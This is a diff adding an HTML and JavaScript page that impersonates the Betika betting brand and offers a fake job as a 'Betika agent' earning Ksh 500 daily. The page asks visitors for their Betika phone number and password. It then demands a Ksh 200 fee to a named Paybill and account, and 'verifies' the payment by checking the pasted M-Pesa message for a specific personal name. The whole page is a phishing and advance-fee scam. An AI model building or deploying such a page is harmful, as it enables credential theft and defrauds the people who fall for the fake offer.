@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betika Agent</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #32CD32;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: #32CD32;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            width: 100px;
+        }
+
+        h2, p {
+            color: white;
+            font-size: 18px;
+        }
+
+        input, textarea {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .btn, .accept-btn {
+            width: 80%;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn {
+            background: navy;
+            color: white;
+        }
+
+        .btn:hover {
+            background: darkblue;
+        }
+
+        .accept-btn {
+            background: red;
+            color: white;
+        }
+
+        .accept-btn:hover {
+            background: darkred;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .warning {
+            color: red;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="loader" class="loader"></div>
+
+        <div id="screen1">
+            <img src="betika-logo.png" alt="Betika Logo" class="logo">
+            <h2>BECOME BETIKA AGENT AND EARN KSH 500 EVERYDAY</h2>
+            <button onclick="showLoading(2)" class="btn">Join us</button>
+        </div>
+
+        <div id="screen2" class="hidden">
+            <h2>WELCOME TO BETIKA AGENT'S HUB</h2>
+            <p>Enter Your Betika Details</p>
+            <input type="number" placeholder="Phone Number" id="phone">
+            <p id="phoneWarning" class="warning hidden">Enter a valid phone number</p>
+            <input type="password" placeholder="Password" id="password">
+            <p id="passwordWarning" class="warning hidden">Password is required</p>
+            <button onclick="validateForm(3)" class="btn">Submit</button>
+        </div>
+
+        <div id="screen3" class="hidden">
+            <h2>BY JOINING YOU ACCEPT ALL TERMS AND CONDITIONS</h2>
+            <button class="accept-btn" onclick="showLoading(4)">
+                Accept
+            </button>
+        </div>
+
+        <div id="screen4" class="hidden">
+            <h2>Complete Your Payment</h2>
+            <p>Pay <strong>Ksh 200</strong> to:</p>
+            <p><strong>Paybill:</strong> 522522</p>
+            <p><strong>Account:</strong> 1318743346</p>
+            <p>After payment, click the button below to continue.</p>
+            <button onclick="showLoading(5)" class="btn">I Have Paid</button>
+        </div>
+
+        <div id="screen5" class="hidden">
+            <h2>Enter Your M-Pesa Confirmation Message</h2>
+            <textarea id="confirmationMessage" rows="4" placeholder="Paste your M-Pesa message here..."></textarea>
+            <p id="confirmationWarning" class="warning hidden">Confirmation message is required</p>
+            <p id="warningMessage" class="warning hidden"></p>
+            <button onclick="verifyPayment()" class="btn">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        let trialsLeft = 3;
+
+        function showLoading(nextScreen) {
+            document.getElementById("loader").style.display = "block";
+            setTimeout(() => {
+                document.getElementById("loader").style.display = "none";
+                showScreen(nextScreen);
+            }, 2000);
+        }
+
+        function showScreen(screenNumber) {
+            document.querySelectorAll('.container > div:not(#loader)').forEach(div => div.classList.add('hidden'));
+            document.getElementById(`screen${screenNumber}`).classList.remove('hidden');
+        }
+
+        function validateForm(nextScreen) {
+            const phone = document.getElementById("phone").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const phoneWarning = document.getElementById("phoneWarning");
+            const passwordWarning = document.getElementById("passwordWarning");
+
+            let valid = true;
+
+            if (!/^(\+254|0)[1-9][0-9]{8}$/.test(phone)) {
+                phoneWarning.classList.remove("hidden");
+                valid = false;
+            } else {
+                phoneWarning.classList.add("hidden");
+            }
+
+            if (password === "") {
+                passwordWarning.classList.remove("hidden");
+                valid = false;
+            } else {
+                passwordWarning.classList.add("hidden");
+            }
+
+            if (valid) {
+                showLoading(nextScreen);
+            }
+        }
+
+        function verifyPayment() {
+            const confirmationMessage = document.getElementById("confirmationMessage").value.trim();
+            const confirmationWarning = document.getElementById("confirmationWarning");
+            const warningMessage = document.getElementById("warningMessage");
+
+            if (confirmationMessage === "") {
+                confirmationWarning.classList.remove("hidden");
+                return;
+            } else {
+                confirmationWarning.classList.add("hidden");
+            }
+
+            const amountPattern = /Ksh\s?200(\.00)?/i;
+            const namePattern = /Enock\s?Cheruiyot/i;
+
+            const amountFound = amountPattern.test(confirmationMessage);
+            const nameFound = namePattern.test(confirmationMessage);
+
+            if (amountFound && nameFound) {
+                alert("Payment Verified! Withdraw Your Earnings From Betika Every 24hrs...");
+                window.location.href = "https://www.betika.com";
+            } else {
+                trialsLeft--;
+                if (trialsLeft > 0) {
+                    let missingInfo = "⚠️ WARNING: ";
+                    if (!amountFound) missingInfo += "Amount is missing. ";
+                    if (!nameFound) missingInfo += "Name is missing. ";
+                    missingInfo += `You have ${trialsLeft} trial(s) left.`;
+                    warningMessage.innerText = missingInfo;
+                } else {
+                    warningMessage.innerText = "🚨 FINAL WARNING: You have been banned due to incorrect payment details!";
+                    document.getElementById("confirmationMessage").disabled = true;
+                }
+                warningMessage.classList.remove("hidden");
+            }
+        }
+    </script>
+</body>
+</html>
